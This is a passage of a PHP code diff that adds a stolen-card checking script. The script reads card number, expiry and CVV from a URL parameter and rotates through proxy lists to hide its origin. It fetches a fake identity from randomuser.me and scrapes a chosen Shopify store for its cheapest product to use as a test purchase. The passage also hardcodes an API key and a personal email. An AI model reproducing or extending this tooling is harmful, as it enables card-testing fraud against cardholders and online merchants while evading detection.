+            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            if ($resp !== false && $code == 200 && $winner === null) {
+                $winner = $entry['proxy'];
+            }
+            curl_multi_remove_handle($mh, $ch);
+            curl_close($ch);
+        }
+        curl_multi_close($mh);
+
+        if ($winner !== null) return $winner;
+    }
+
+    return null;
+}
+
+/**
+ * Check if a given proxy can reach a specific URL (HEAD/GET)
+ */
+function proxy_can_reach_url(string $proxyStr, string $url, int $timeout = 5): bool {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_NOBODY, false); // small GET is safer as some hosts block HEAD
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    // timeouts adjusted below based on proxy type
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'User-Agent: '.flow_user_agent(),
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Connection: keep-alive'
+    ]);
+
+    // Parse proxy scheme/type
+    $pc = parse_proxy_components($proxyStr);
+    $type = $pc['type'];
+    $proxyAddr = $pc['host'] . ($pc['port'] !== '' ? ':' . $pc['port'] : '');
+    curl_setopt($ch, CURLOPT_PROXY, $proxyAddr);
+    if ($type === 'socks4' || $type === 'socks4a') {
+        $pt = (defined('CURLPROXY_SOCKS4A') && $type === 'socks4a') ? CURLPROXY_SOCKS4A : CURLPROXY_SOCKS4;
+        curl_setopt($ch, CURLOPT_PROXYTYPE, $pt);
+    } elseif ($type === 'socks5' || $type === 'socks5h') {
+        $pt = (defined('CURLPROXY_SOCKS5_HOSTNAME') && $type === 'socks5h') ? CURLPROXY_SOCKS5_HOSTNAME : CURLPROXY_SOCKS5;
+        curl_setopt($ch, CURLOPT_PROXYTYPE, $pt);
+    } elseif ($type === 'https') {
+        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
+    } else {
+        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+    }
+    if ($pc['user'] !== '') {
+        $u = transform_rotating_username($pc['user']);
+        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $u . ':' . $pc['pass']);
+    }
+
+    // Adjust timeouts: SOCKS often needs more time
+    $actualTimeout = ($type === 'socks4' || $type === 'socks5') ? ($timeout * 2) : $timeout;
+    curl_setopt($ch, CURLOPT_TIMEOUT, $actualTimeout);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $actualTimeout);
+
+    // Enable CONNECT only for HTTPS targets when using HTTP/HTTPS proxies
+    $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?: 'http');
+    $needsTunnel = ($scheme === 'https' && ($type === 'http' || $type === 'https'));
+    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, $needsTunnel);
+    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+    if (defined('CURLOPT_PROXYHEADER') && ($type === 'http' || $type === 'https')) {
+        curl_setopt($ch, CURLOPT_PROXYHEADER, ['Proxy-Connection: Keep-Alive']);
+    }
+
+    $resp = curl_exec($ch);
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    // Consider any HTTP response code > 0 as reachable (5xx often indicates server-side blocks but proxy path works)
+    return ($resp !== false && $code > 0);
+}
+
+/**
+ * Pick the first proxy from file that can reach a specific URL
+ */
+function select_working_proxy_for_url(string $file, string $url, int $timeout = 3, int $concurrency = 200): ?string {
+    if (!file_exists($file)) return null;
+    $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if (!$lines) return null;
+    $proxies = [];
+    foreach ($lines as $line) {
+        $p = trim($line);
+        if ($p === '' || $p[0] === '#') continue;
+        $proxies[] = $p;
+    }
+    if (empty($proxies)) return null;
+
+    $chunks = array_chunk($proxies, max(1, $concurrency));
+    foreach ($chunks as $chunk) {
+        $mh = curl_multi_init();
+        $handles = [];
+
+        foreach ($chunk as $proxyStr) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+            curl_setopt($ch, CURLOPT_ENCODING, '');
+            curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
+
+            // Proxy setup
+            $type = 'http';
+            $proxyAddr = $proxyStr;
+            if (preg_match('/^(https?|socks4|socks5):\/\/(.+)$/i', $proxyStr, $m)) {
+                $type = strtolower($m[1]);
+                $proxyAddr = $m[2];
+            }
+            curl_setopt($ch, CURLOPT_PROXY, $proxyAddr);
+            if ($type === 'socks4') curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
+            elseif ($type === 'socks5') curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+            elseif ($type === 'https') curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);
+            else curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+
+            $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?: 'http');
+            $needsTunnel = ($scheme === 'https' && ($type === 'http' || $type === 'https'));
+            curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, $needsTunnel);
+            curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+            if (defined('CURLOPT_PROXYHEADER') && ($type === 'http' || $type === 'https')) {
+                curl_setopt($ch, CURLOPT_PROXYHEADER, ['Proxy-Connection: Keep-Alive']);
+            }
+
+            curl_multi_add_handle($mh, $ch);
+            $handles[] = ['h' => $ch, 'proxy' => $proxyStr];
+        }
+
+        $running = null;
+        do {
+            $mrc = curl_multi_exec($mh, $running);
+            if ($running) curl_multi_select($mh, 1.0);
+        } while ($running && $mrc == CURLM_OK);
+
+        $winner = null;
+        foreach ($handles as $entry) {
+            $ch = $entry['h'];
+            $resp = curl_multi_getcontent($ch);
+            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            if ($resp !== false && $code >= 200 && $code < 500 && $winner === null) {
+                $winner = $entry['proxy'];
+            }
+            curl_multi_remove_handle($mh, $ch);
+            curl_close($ch);
+        }
+        curl_multi_close($mh);
+
+        if ($winner !== null) return $winner;
+    }
+    return null;
+}
+
+function add_proxy_details_to_result(array $result_data, bool $proxy_used, string $proxy_ip, string $proxy_port): string {
+    // Preserve explicit ProxyStatus if already set; otherwise infer from usage
+    if (!isset($result_data['ProxyStatus'])) {
+        $result_data['ProxyStatus'] = ($proxy_used ? 'Live' : 'Bypassed (direct IP)');
+    }
+    $result_data['ProxyIP'] = ($proxy_used ? ($proxy_ip . ($proxy_port !== '' ? ':' . $proxy_port : '')) : 'N/A');
+    return json_encode($result_data);
+}
+
+function send_final_response(array $result_data, bool $proxy_used, string $proxy_ip, string $proxy_port) {
+    // Cleanup per-request cookie file if present
+    if (isset($GLOBALS['__cookie_file']) && is_string($GLOBALS['__cookie_file'])) {
+        $cf = $GLOBALS['__cookie_file'];
+        if (is_file($cf)) { @unlink($cf); }
+    }
+    $final_result = add_proxy_details_to_result($result_data, $proxy_used, $proxy_ip, $proxy_port);
+    echo $final_result;
+    exit;
+}
+
+$proxy_ip = '';
+$proxy_port = '';
+$proxy_user = '';
+$proxy_pass = '';
+$proxy_type = 'http'; // Default proxy type
+$proxy_status = 'N/A'; // Default status
+$proxy_used = false;
+
+// Check for noproxy parameter (bypasses all proxy usage)
+$noproxy_requested = isset($_GET['noproxy']);
+// Optional: require proxy strictly, otherwise fallback to direct when none available
+$require_proxy = false;
+if (isset($_GET['requireProxy'])) {
+    $val = strtolower((string)$_GET['requireProxy']);
+    $require_proxy = ($val === '1' || $val === 'true');
+}
+
+if ($noproxy_requested) {
+    // User explicitly requested no proxy - use direct IP
+    $proxy_used = false;
+    $proxy_status = 'Bypassed (direct IP)';
+} elseif (isset($_GET['proxy']) && !empty($_GET['proxy'])) {
+    $rawProxy = trim((string)$_GET['proxy']);
+    $hasScheme = preg_match('/^(https?|socks5h?|socks4a?|socks[45]):\/\//i', $rawProxy);
+    $pc = parse_proxy_components($rawProxy);
+    $proxy_type = $pc['type'];
+    $proxy_ip = $pc['host'];
+    $proxy_port = $pc['port'];
+    $proxy_user = $pc['user'];
+    $proxy_pass = $pc['pass'];
+
+    if ($proxy_ip !== '' && $proxy_port !== '') {
+        if (!$hasScheme) {
+            // Auto-detect proxy type by testing all protocols (prefer target site)
+            $detectedType = detect_proxy_type($proxy_ip, $proxy_port, $proxy_user, $proxy_pass, $__requested_site_for_test);
+            if ($detectedType) {
+                $proxy_type = $detectedType;
+                $proxy_status = "Live (auto-detected: $detectedType)";
+                $proxy_used = true;
+                save_proxy_to_file(normalize_proxy_string($proxy_type, $proxy_ip, $proxy_port, $proxy_user, $proxy_pass), 'ProxyList.txt');
+            } else {
+                $proxy_status = 'Dead';
+                $proxy_used = false;
+                send_final_response([
+                    'Response' => 'Proxy failed validation with all protocols (socks5/socks5h, http, socks4/socks4a, https). Check if proxy is online or supports HTTPS tunneling.',
+                    'ProxyStatus' => $proxy_status,
+                    'ProxyIP' => $proxy_ip . ':' . $proxy_port,
+                    'TestedProtocols' => ['socks5','socks5h','http','socks4','socks4a','https']
+                ], false, $proxy_ip, $proxy_port);
+            }
+        } else {
+            // Scheme provided: trust SOCKS quickly; validate HTTP/HTTPS
+            if (strpos($proxy_type, 'socks') === 0) {
+                $proxy_status = 'Live (trusted)';
+                $proxy_used = true;
+                save_proxy_to_file(normalize_proxy_string($proxy_type, $proxy_ip, $proxy_port, $proxy_user, $proxy_pass), 'ProxyList.txt');
+            } elseif (test_proxy($proxy_ip, $proxy_port, $proxy_user, $proxy_pass, $proxy_type)) {
+                $proxy_status = 'Live';
+                $proxy_used = true;
+                save_proxy_to_file(normalize_proxy_string($proxy_type, $proxy_ip, $proxy_port, $proxy_user, $proxy_pass), 'ProxyList.txt');
+            } else {
+                $proxy_status = 'Dead';
+                $proxy_used = false;
+                send_final_response([
+                    'Response' => 'Provided HTTP/HTTPS proxy failed validation. Try auto-detection by removing scheme prefix.',
+                    'ProxyStatus' => $proxy_status,
+                    'ProxyIP' => $proxy_ip . ':' . $proxy_port,
+                    'ProxyType' => $proxy_type
+                ], false, $proxy_ip, $proxy_port);
+            }
+        }
+    } else {
+        $proxy_status = 'Invalid Format';
+    }
+}
+
+// If no proxy provided and noproxy not set, auto-pick a working one from ProxyList.txt using parallel testing
+if (!$noproxy_requested && !$proxy_used && (!isset($_GET['proxy']) || empty($_GET['proxy']))) {
+    // If we know the site already, prefer selecting a proxy that can reach it; fallback to generic
+    $siteParam = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
+    $candidate = null;
+    if (!empty($siteParam)) {
+        $host = parse_url($siteParam, PHP_URL_HOST);
+        $siteUrl = 'https://' . $host;
+        $candidate = select_working_proxy_for_url('ProxyList.txt', $siteUrl, 3, 20);
+    }
+    $autoProxy = $candidate ?: select_working_proxy_parallel('ProxyList.txt', 6, 10);
+    if ($autoProxy) {
+        // Parse into components
+        $ptype = 'http';
+        $addr = $autoProxy;
+        if (preg_match('/^(https?|socks4|socks5):\/\/(.+)$/i', $autoProxy, $m)) {
+            $ptype = strtolower($m[1]);
+            $addr = $m[2];
+        }
+        $parts = explode(':', $addr);
+        if (count($parts) >= 2) {
+            $proxy_ip = $parts[0];
+            $proxy_port = $parts[1];
+            if (count($parts) >= 4) { $proxy_user = $parts[2]; $proxy_pass = $parts[3]; }
+            $proxy_type = $ptype;
+            $proxy_used = true;
+            $proxy_status = 'Live';
+        }
+    }
+}
+
+// If proxy isn't used (none provided or all invalid) and user didn't force proxy, fall back to direct
+if (!$noproxy_requested && !$proxy_used && !$require_proxy) {
+    $proxy_used = false; // proceed without proxy
+}
+// If proxy is required strictly and none is available, stop with clear message
+if (!$noproxy_requested && !$proxy_used && $require_proxy) {
+    $proxyCount = file_exists('ProxyList.txt') ? count(file('ProxyList.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) : 0;
+    send_final_response([
+        'Response' => 'No working proxy available and requireProxy=1. Update ProxyList.txt, provide ?proxy=scheme://ip:port, or remove requireProxy to proceed direct.',
+        'ProxyStatus' => 'Dead',
+        'ProxyIP' => 'N/A',
+        'ProxiesInFile' => $proxyCount
+    ], false, '', '');
+}
+
+
+// Validate CC parameter
+if (!isset($_GET['cc']) || empty($_GET['cc'])) {
+    send_final_response(['Response' => 'CC parameter is required'], false, '', '');
+}
+
+$cc1 = $_GET['cc'];
+$cc_partes = explode("|", $cc1);
+
+if (count($cc_partes) < 4) {
+    send_final_response(['Response' => 'Invalid CC format. Use: cc|month|year|cvv'], false, '', '');
+}
+
+$cc = $cc_partes[0];
+$month = $cc_partes[1];
+$year = $cc_partes[2];
+$cvv = $cc_partes[3];
+/*=====  sub_month  ======*/
+$yearcont=strlen($year);
+if ($yearcont<=2){
+$year = "20$year";
+}
+if($month == "01"){
+$sub_month = "1";
+}elseif($month == "02"){
+$sub_month = "2";
+}elseif($month == "03"){
+$sub_month = "3";
+}elseif($month == "04"){
+$sub_month = "4";
+}elseif($month == "05"){
+$sub_month = "5";
+}elseif($month == "06"){
+$sub_month = "6";
+}elseif($month == "07"){
+$sub_month = "7";
+}elseif($month == "08"){
+$sub_month = "8";
+}elseif($month == "09"){
+$sub_month = "9";
+}elseif($month == "10"){
+$sub_month = "10";
+}elseif($month == "11"){
+$sub_month = "11";
+}elseif($month == "12"){
+$sub_month = "12";
+}
+
+$geoaddress = urlencode("$num_us, $address_us, $city_us");
+// echo "<li>geoaddress: $geoaddress<li>";
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://us1.locationiq.com/v1/search?key=pk.87eafaf1c832302b01301bf903d7897e&q='.$geoaddress.'&format=json');
+apply_proxy_if_used($ch, 'https://us1.locationiq.com/v1/search');
+apply_common_timeouts($ch);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$geocoding = curl_exec($ch);
+curl_close($ch);
+
+$geocoding_data = json_decode($geocoding, true);
+
+// Validate geocoding response
+if (!$geocoding_data || !is_array($geocoding_data) || !isset($geocoding_data[0])) {
+    // Use default coordinates if geocoding fails
+    $lat = 40.7128; // New York default
+    $lon = -74.0060;
+} else {
+    $lat = (float) $geocoding_data[0]['lat'];
+    $lon = (float) $geocoding_data[0]['lon'];
+}
+
+// echo "<li>lat: $lat<li>";
+// echo "<li>lon: $lon<li>";
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
+apply_proxy_if_used($ch, 'https://randomuser.me/api');
+apply_common_timeouts($ch);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$resposta = curl_exec($ch);
+curl_close($ch);
+
+$firstname = find_between($resposta, '"first":"', '"');
+$lastname = find_between($resposta, '"last":"', '"');
+// Remove or comment out the lines that generate a random email
+// $email = find_between($resposta, '"email":"', '"');
+// $serve_arr = array("gmail.com","yahoo.com","hotmail.com","outlook.com");
+// $serv_rnd = $serve_arr[array_rand($serve_arr)];
+// $email = str_replace("example.com", $serv_rnd, $email);
+
+// Set your own email directly
+$email = "sarthakgrid@gmail.com"; // Replace with your actual email
+
+function getMinimumPriceProductDetails(string $json): array {
+    $data = json_decode($json, true);
+    
+    if (!is_array($data) || !isset($data['products']) || !is_array($data['products'])) {
+        throw new Exception('Invalid JSON format or missing/invalid products key');
+    }
+
+    // Initialize minPrice as null to find the minimum valid price (above 0.01)
+    $minPrice = null;
+    $minPriceDetails = [
+        'id' => null,
+        'price' => null,
+        'title' => null,
+    ];
+
+    foreach ($data['products'] as $product) {
+        // Check if 'variants' key exists and is an array
+        if (!isset($product['variants']) || !is_array($product['variants'])) {
+            continue; // Skip this product if variants are missing or not an array
+        }
+        foreach ($product['variants'] as $variant) {
+            // Check if 'price' key exists
+            if (!isset($variant['price'])) {
+                continue; // Skip this variant if price is missing
+            }
+            $price = (float) $variant['price'];
+            // Skip prices below 0.01 (including 0.00)
+            if ($price >= 0.01) {
+                // If minPrice is null or the current price is lower than minPrice, update minPriceDetails
+                if ($minPrice === null || $price < $minPrice) {
+                    $minPrice = $price;
+                    $minPriceDetails = [
+                        'id' => $variant['id'] ?? null, // Use null coalescing operator for safer access
+                        'price' => $variant['price'] ?? null,
+                        'title' => $product['title'] ?? null,
+                    ];
+                }
+            }
+        }
+    }
+
+    // If no valid price was found, return an error message or keep minPriceDetails as null.
+    if ($minPrice === null) {
+        throw new Exception('No products found with price greater than or equal to 0.01');
+    }
+
+    return $minPriceDetails;
+}
+
+// Lightweight HTTP GET returning [body, code]
+function http_get_with_proxy(string $url, ?string $cookieFile = null, array $headers = []) : array {
+    // fresh UA per request
+    $dynamicUA = (function(){ static $uaGen=null; if($uaGen===null){$uaGen = new userAgent();} return $uaGen->generate('windows'); })();
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    if ($cookieFile) {
+        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
+        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
+    }
+    $defaultHeaders = [
+        'User-Agent: '.flow_user_agent(),
+        'Accept: application/json, text/javascript, */*; q=0.1',
+        'Referer: '.(parse_url($url, PHP_URL_SCHEME) . '://' . parse_url($url, PHP_URL_HOST) . '/'),
+        'X-Requested-With: XMLHttpRequest'
+    ];
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($defaultHeaders, $headers));
+    apply_proxy_if_used($ch, $url);
+    $body = curl_exec($ch);
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    return [$body, $code];
+}
+
+// Parallel HTTP GET for multiple URLs (same headers/cookies) using curl_multi
+// Returns assoc array url => [body, code]
+function multi_http_get_with_proxy(array $urls, ?string $cookieFile = null, array $headers = [], int $timeout = 10, int $connectTimeout = 5): array {
+    $mh = curl_multi_init();
+    $handles = [];
+    foreach ($urls as $url) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connectTimeout);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        if ($cookieFile) {
+            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
+            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
+        }
+        $defaultHeaders = [
+            'User-Agent: '.flow_user_agent(),
+            'Accept: application/json, text/javascript, */*; q=0.1',
+            'Referer: '.(parse_url($url, PHP_URL_SCHEME) . '://' . parse_url($url, PHP_URL_HOST) . '/'),
+            'Connection: keep-alive'
+        ];
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($defaultHeaders, $headers));
+        // Apply proxy and performance flags similar to http_get_with_proxy
+        curl_setopt($ch, CURLOPT_ENCODING, '');
+        curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
+        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 60);
+        apply_proxy_if_used($ch, $url);
+
+        curl_multi_add_handle($mh, $ch);
+        $handles[] = ['h' => $ch, 'u' => $url];
+    }
+
+    $running = null;
+    do {
+        $mrc = curl_multi_exec($mh, $running);
+        if ($running) curl_multi_select($mh, 1.0);
+    } while ($running && $mrc == CURLM_OK);
+
+    $out = [];
+    foreach ($handles as $entry) {
+        $ch = $entry['h'];
+        $url = $entry['u'];
+        $body = curl_multi_getcontent($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $out[$url] = [$body, $code];
+        curl_multi_remove_handle($mh, $ch);
+        curl_close($ch);
+    }
+    curl_multi_close($mh);
+    return $out;
+}
+
+// Chunked variant: fetch many URLs in batches to limit concurrency (default batch size 8)
+function multi_http_get_with_proxy_chunked(array $urls, ?string $cookieFile = null, array $headers = [], int $timeout = 10, int $connectTimeout = 5, int $batchSize = 8): array {
+    $out = [];
+    if ($batchSize <= 1) { return multi_http_get_with_proxy($urls, $cookieFile, $headers, $timeout, $connectTimeout); }
+    $chunks = array_chunk($urls, $batchSize);
+    foreach ($chunks as $chunk) {
+        $res = multi_http_get_with_proxy($chunk, $cookieFile, $headers, $timeout, $connectTimeout);
+        $out = $out + $res;
+    }
+    return $out;
+}
+
+// Try to fetch products from multiple Shopify JSON endpoints
+function fetchProductsJson(string $baseUrl, ?string $cookieFile = null) : array {
+    // Warm cookies by visiting homepage once
+    http_get_with_proxy($baseUrl.'/', $cookieFile, ['Accept: text/html,application/xhtml+xml']);
+
+    $candidates = [
+        $baseUrl.'/products.json?limit=250',
+        $baseUrl.'/products.json',
+        $baseUrl.'/collections/all/products.json?limit=250',
+    ];
+
+    // Try direct endpoints first (in parallel)
+    $multiResults = multi_http_get_with_proxy($candidates, $cookieFile);
+    foreach ($candidates as $u) {
+        if (!isset($multiResults[$u])) continue;
+        [$body, $code] = $multiResults[$u];
+        if ($code >= 200 && $code < 300) {
+            $js = json_decode($body, true);
+            if (is_array($js) && isset($js['products']) && is_array($js['products']) && count($js['products']) > 0) {
+                return $js;
+            }
+        }
+    }
+
+    // Fallback: fetch collections and then products per collection
+    [$colBody, $colCode] = http_get_with_proxy($baseUrl.'/collections.json?limit=50', $cookieFile);
+    if ($colCode >= 200 && $colCode < 300) {
+        $col = json_decode($colBody, true);
+        if (is_array($col) && isset($col['collections']) && is_array($col['collections'])) {
+            $products = [];
+            $tries = 0;
+            foreach ($col['collections'] as $c) {
+                if (!isset($c['handle'])) continue;
+                $handle = $c['handle'];
+                [$pb, $pc] = http_get_with_proxy($baseUrl.'/collections/'.$handle.'/products.json?limit=250', $cookieFile);
+                if ($pc >= 200 && $pc < 300) {
+                    $pj = json_decode($pb, true);
+                    if (is_array($pj) && isset($pj['products']) && is_array($pj['products'])) {
+                        $products = array_merge($products, $pj['products']);
+                    }
+                }
+                $tries++;
+                if ($tries >= 3 && count($products) > 0) break; // limit breadth for speed
+            }
+            if (count($products) > 0) {
+                return ['products' => $products];
+            }
+        }
+    }
+
+    // Fallback: try product sitemap(s)
+    $sitemapCandidates = [
+        $baseUrl.'/sitemap_products_1.xml',
+        $baseUrl.'/sitemap.xml'
+    ];
+    foreach ($sitemapCandidates as $sm) {
+        [$sb, $sc] = http_get_with_proxy($sm, $cookieFile, ['Accept: application/xml,text/xml;q=0.9,*/*;q=0.1']);
+        if ($sc >= 200 && $sc < 300 && is_string($sb) && stripos($sb, '<urlset') !== false || stripos($sb, '<sitemapindex') !== false) {
+            $handles = extract_product_handles_from_sitemap($sb);
+            if (!empty($handles)) {
+                $collected = fetch_products_by_handles($baseUrl, $handles, $cookieFile, 10);
+                if (!empty($collected)) return ['products' => $collected];
+            }
+        }
+    }
+
+    // Fallback: scrape homepage and collections/all for product links
+    [$homeHtml, $hc] = http_get_with_proxy($baseUrl.'/', $cookieFile, ['Accept: text/html,application/xhtml+xml']);
+    $handles = extract_product_handles_from_html($homeHtml);
+    if (empty($handles)) {
+        [$allHtml, $ac] = http_get_with_proxy($baseUrl.'/collections/all', $cookieFile, ['Accept: text/html,application/xhtml+xml']);
+        $handles = extract_product_handles_from_html($allHtml);
+    }
+    if (!empty($handles)) {
+        $collected = fetch_products_by_handles($baseUrl, $handles, $cookieFile, 10);
+        if (!empty($collected)) return ['products' => $collected];
+    }
+
+    throw new Exception('Could not retrieve products JSON from the store (endpoints blocked or empty).');
+}
+
+// Extract product handles from sitemap XML content
+function extract_product_handles_from_sitemap(string $xml): array {
+    $handles = [];
+    // Product URLs usually contain /products/<handle>
+    if (preg_match_all('#/products/([a-z0-9\-_%]+)/?#i', $xml, $m)) {
+        $seen = [];
+        foreach ($m[1] as $h) {
+            $h = trim($h);
+            if ($h !== '' && !isset($seen[$h])) { $handles[] = $h; $seen[$h] = true; }
+        }
+    }
+    // If sitemap index, try to find product sitemap links (but parsing them here is heavy; the first regex often catches URLs too)
+    return array_slice($handles, 0, 20);
+}
+
+// Extract product handles from HTML by scanning anchor hrefs
+function extract_product_handles_from_html(?string $html): array {
+    if (!$html) return [];
+    $handles = [];
+    if (preg_match_all('#href=["\'](/products/([a-z0-9\-_%]+))["\']#i', $html, $m)) {
+        $seen = [];
+        foreach ($m[2] as $h) {
+            $h = trim($h);
+            if ($h !== '' && !isset($seen[$h])) { $handles[] = $h; $seen[$h] = true; }
+        }
+    }
+    return array_slice($handles, 0, 30);
+}
+
+// Fetch product JSONs for a set of handles and collect as products
+function fetch_products_by_handles(string $baseUrl, array $handles, ?string $cookieFile = null, int $limit = 10): array {
+    $products = [];
+    if ($limit <= 0) return $products;
+    // Build up to $limit product JSON URLs
+    $urls = [];
+    foreach ($handles as $h) {
+        $urls[] = $baseUrl.'/products/'.$h.'.json';
+        if (count($urls) >= $limit) break;
+    }
+    if (empty($urls)) return $products;
+
+    // Fetch in batches in parallel (batch size 8), with unchanged timeout values
+    $results = multi_http_get_with_proxy_chunked($urls, $cookieFile, [], 10, 5, 8);
+    foreach ($urls as $u) {
+        if (!isset($results[$u])) continue;
+        [$body, $code] = $results[$u];
+        if ($code >= 200 && $code < 300) {
+            $pj = json_decode($body, true);
+            if (is_array($pj) && isset($pj['product']) && is_array($pj['product'])) {
+                $products[] = $pj['product'];
+            }
+        }
+    }
+    return $products;
+}
+
+$site1 = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
+$site1 = parse_url($site1, PHP_URL_HOST);
+$site1 = 'https://' . $site1;
+$site1 = filter_var($site1, FILTER_VALIDATE_URL);
+if ($site1 === false) {
+    $err = 'Invalid URL';
+    $result_data = [
+        'Response' => $err,
+    ];
+    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+}
+
+// If a proxy was selected (user or auto), verify it can reach the target site with proper HTTPS support
+if ($proxy_used) {
+    // Build full proxy string with credentials for testing
+    $fullProxy = ($proxy_type ? ($proxy_type.'://') : '');
+    if ($proxy_user !== '' && $proxy_pass !== '') {
+        $fullProxy .= $proxy_user . ':' . $proxy_pass . '@';
+    }
+    $fullProxy .= $proxy_ip . ':' . $proxy_port;
+    
+    $maxRetries = 3;
+    $retryAttempt = 0;
+    $proxyWorks = false;
+    
+    while (!$proxyWorks && $retryAttempt < $maxRetries) {
+        // Test if proxy can reach the target site (HTTPS support required for Shopify)
+        if (proxy_can_reach_url($fullProxy, $site1, 3)) {
+            $proxyWorks = true;
+            break;
+        }
+        
+        $retryAttempt++;
+        
+        // If this proxy failed and was auto-picked, try another from the pool
+        if (!isset($_GET['proxy']) || empty($_GET['proxy'])) {
+            $alt = select_working_proxy_for_url('ProxyList.txt', $site1, 3, 20);
+            if ($alt) {
+                // Re-parse alt proxy
+                $ptype = 'http';
+                $addr = $alt;
+                if (preg_match('/^(https?|socks4|socks5):\/\/(.+)$/i', $alt, $m)) {
+                    $ptype = strtolower($m[1]);
+                    $addr = $m[2];
+                }
+                $parts = explode(':', $addr);
+                if (count($parts) >= 2) {
+                    $proxy_ip = $parts[0];
+                    $proxy_port = $parts[1];
+                    if (count($parts) >= 4) { $proxy_user = $parts[2]; $proxy_pass = $parts[3]; }
+                    $proxy_type = $ptype;
+                    $proxy_used = true;
+                    $proxy_status = 'Live';
+                    $fullProxy = ($proxy_type ? ($proxy_type.'://') : '') . $proxy_ip . ':' . $proxy_port;
+                    // Continue loop to test this new proxy
+                    continue;
+                }
+            }
+            // No more proxies available
+            break;
+        } else {
+            // User provided proxy failed - don't retry with auto-selection
+            break;
+        }
+    }
+    
+    // Final check: did we find a working proxy?
+    if (!$proxyWorks) {
+        if ((!isset($_GET['proxy']) || empty($_GET['proxy'])) && !$require_proxy) {
+            // Fallback to direct connection
+            $proxy_used = false;
+        } else {
+            // Either user provided proxy explicitly (and it failed), or requireProxy=1
+            $msg = (!isset($_GET['proxy']) || empty($_GET['proxy']))
+                ? 'No proxy can reach the target site and requireProxy=1. Update ProxyList.txt or use ?noproxy to bypass.'
+                : 'Provided proxy cannot reach the target site (CONNECT aborted or blocked). The proxy may not support HTTPS tunneling. Use a different proxy or ?noproxy.';
+            send_final_response([
+                'Response' => $msg,
+                'ProxyStatus' => 'Dead for this site',
+                'ProxyIP' => $proxy_ip . ':' . $proxy_port,
+                'TriedProxies' => $retryAttempt
+            ], false, $proxy_ip, $proxy_port);
+        }
+    }
+}
+
+    $site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
+    try {
+        $productsData = fetchProductsJson($site2, 'cookie.txt');
+        $r1 = json_encode($productsData);
+        $productDetails = getMinimumPriceProductDetails($r1);
+        $minPriceProductId = $productDetails['id'];
+        $minPrice = $productDetails['price'];
+        $productTitle = $productDetails['title'];
